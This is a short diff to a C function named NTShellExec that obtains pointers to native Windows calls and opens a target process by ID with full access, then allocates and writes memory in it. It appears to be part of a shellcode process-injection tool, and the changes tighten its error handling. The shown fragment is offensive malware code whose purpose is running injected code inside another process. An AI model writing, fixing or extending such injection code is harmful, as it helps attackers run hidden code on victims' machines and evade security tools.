@@ -33,12 +33,12 @@ int NTShellExec(DWORD process_id){
 
     if(ptrOpenProcess == NULL){
         printf("unable to get ptr to NtOpenProcess with error : %zd\n", GetLastError());
-        goto CLEANUP;
+        return EXIT_FAILURE;
     }
 
     NTSTATUS OpenProcess_status = ptrOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
 
-    if(OpenProcess_status == NULL){
+    if(OpenProcess_status != STATUS_SUCCESS){
         printf("unable to get handle to process...\n");
         goto CLEANUP;
     }
@@ -49,7 +49,7 @@ int NTShellExec(DWORD process_id){
 
     if(ptrAllocateVirtualMemory == NULL){
         printf("unable to get ptr to NtAllocateVirtualMemory with error : %zd\n", GetLastError());
-        goto CLEANUP;
+        return EXIT_FAILURE;
     }
 
     //params
@@ -70,6 +70,7 @@ int NTShellExec(DWORD process_id){
 
     if(ptrWriteVirtualMemory == NULL){
         printf("unable to get ptr to NtWriteVirtualMemory with error : %zd \n", GetLastError());
+        return EXIT_FAILURE;
     }
 
     //write memory
